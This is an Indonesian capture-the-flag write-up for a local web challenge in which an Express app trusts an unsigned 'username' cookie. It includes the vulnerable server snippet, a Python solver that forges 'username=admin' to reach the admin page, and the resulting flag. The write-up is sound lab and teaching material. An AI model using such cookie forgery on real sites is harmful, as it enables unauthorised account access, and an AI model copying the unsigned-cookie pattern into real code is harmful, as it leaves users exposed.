# WriteUp: Akun admin lagi

## Overview

* **Judul:** Akun admin lagi
* **Kategori:** Access Control
* **Poin:** 250
* **Deskripsi:** Bisa ngga lu masuk ke akun **admin** lagi?
* **Author:** (Unknown/Platform Specific)
* **URL:** `http://localhost:1339`

## Informasi Attachment

File yang diberikan adalah `akun-admin2.yml`.

**Struktur Direktori:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Authentication/Akun admin lagi]
└─$ tree
.
├── akun-admin2.yml
└── exploit.py

0 directories, 2 files

```

**Konten File (`akun-admin2.yml`):**
*(Versi yang telah dimodifikasi untuk menghapus resource limits dan mengubah port agar tidak bentrok)*

```yaml
services:
  web:
    image: ghcr.io/hengkerrusia/auth2:latest
    ports:
      - "1339:3000"
    environment:
      - PWN=${PWN:-testuser}

```

## Proses Penyelesaian

### 1. Menjalankan Environment

Challenge dijalankan menggunakan Docker Compose dengan port **1339**.

**Output Terminal:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Authentication/Akun admin lagi]
└─$ PWN=WanZKey docker compose -f akun-admin2.yml up -d --build
[+] up 13/13
 ✔ Image ghcr.io/hengkerrusia/auth2:latest Pulled                                                                  12.9s
 ✔ Network akunadminlagi_default Created                                                                            0.2s
 ✔ Container akunadminlagi-web-1 Created                                                                            0.1s

```

### 2. Reconnaissance & Source Code Analysis (White Box)

Melakukan inspeksi ke dalam container untuk mencari file source code aplikasi (Node.js/Express).

**Output Terminal:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Authentication/Akun admin lagi]
└─$ docker exec akunadminlagi-web-1 cat server.js
// ... (Snippet) ...
app.get('/admin', (req, res) => {
    const username = req.cookies.username;
    if (!username) return res.redirect('/login');

    db.get("SELECT * FROM users WHERE username = ? COLLATE NOCASE", [username], (err, row) => {
        if (row && row.username === 'admin') {
            return res.render('admin', { flag: process.env.FLAG || 'pwn{test_flag}' });
        }
        res.render('error', { message: 'Access Denied. You are not admin.' });
    });
});
// ...

```

**Analisis Kerentanan:**

1. **Insecure Cookie Handling:** Aplikasi mengambil nilai `req.cookies.username` secara langsung tanpa validasi sesi atau tanda tangan digital (signature).
2. **SQL Collation Injection (`COLLATE NOCASE`):** Query database menggunakan `COLLATE NOCASE` yang membuat pencarian menjadi *case-insensitive*.
3. **Broken Access Control:** Server mempercayai input cookie pengguna sebagai identitas otentikasi. Penyerang cukup membuat cookie dengan nama `username` dan nilai `admin` (plaintext) untuk mendapatkan akses penuh, karena query database akan mengembalikan baris user admin yang valid, dan kondisi `row.username === 'admin'` akan bernilai *true*.

## Script Solver

Script berikut memanipulasi HTTP Request dengan menyuntikkan cookie `username=admin`.

**File:** `exploit.py`

```python
import requests
import re

# Target URL (Port 1339)
URL = "http://localhost:1339/admin"

def exploit():
    print("[*] Target:", URL)
    
    # Vulnerability:
    # Server percaya input cookie 'username' mentah-mentah.
    # Tidak perlu Base64, cukup plaintext string 'admin'.
    payload = 'admin'
    print(f"[*] Forging Cookie: username={payload}")
    
    cookies = {'username': payload}
    
    try:
        r = requests.get(URL, cookies=cookies)
        
        if r.status_code == 200:
            print("[+] Admin Access Granted!")
            # Regex untuk menangkap flag format pwn{...}
            flag = re.search(r'pwn\{.*?\}', r.text)
            if flag:
                print(f"\n[!!!] FLAG FOUND: {flag.group(0)}\n")
            else:
                print("[-] Masuk page admin, tapi flag tidak ditemukan regex.")
        else:
            print(f"[-] Failed. Status Code: {r.status_code}")
            
    except Exception as e:
        print(f"[-] Connection Error: {e}")

if __name__ == "__main__":
    exploit()

```

## Output Terminal Solver

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Authentication/Akun admin lagi]
└─$ python3 exploit.py
[*] Target: http://localhost:1339/admin
[*] Forging Cookie: username=admin
[+] Admin Access Granted!

[!!!] FLAG FOUND: pwn{1a9a6d42701fe03d11e1fa153ab61b2d}

```

## Flag

```
pwn{1a9a6d42701fe03d11e1fa153ab61b2d}

```
